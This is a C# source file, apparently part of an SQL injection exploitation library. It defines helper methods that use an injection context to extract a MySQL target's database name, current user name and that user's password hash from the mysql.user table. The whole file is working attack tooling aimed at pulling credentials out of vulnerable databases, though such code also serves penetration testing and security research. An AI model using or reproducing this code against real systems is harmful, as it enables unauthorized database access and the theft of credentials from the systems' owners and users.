using System.Linq;
using System.Threading.Tasks;


namespace PeterJuhasz.SqlInjection
{
    using static MySqlFunctions;

    public static class MySqlInjectionContextExtensions
    {
        public static Task<string> GetDatabaseNameAsync(this MySqlInjectionContext context, int estimatedLength = 16) =>
            context.Dual.Select(_ => Database()).FirstAsync(estimatedLength);

        public static Task<string> GetDatabaseUserNameAsync(this MySqlInjectionContext context, int estimatedLength = 32) =>
            context.Dual.Select(_ => User()).FirstAsync(estimatedLength);

        public static async Task<string> GetDatabasePasswordAsync(this MySqlInjectionContext context)
        {
            var user = await context.GetDatabaseUserNameAsync();
            return await context.MySql.Users.Where(u => u.Name == user).Select(u => u.AuthenticationString).FirstAsync(estimatedLength: 40);
        }
    }
}
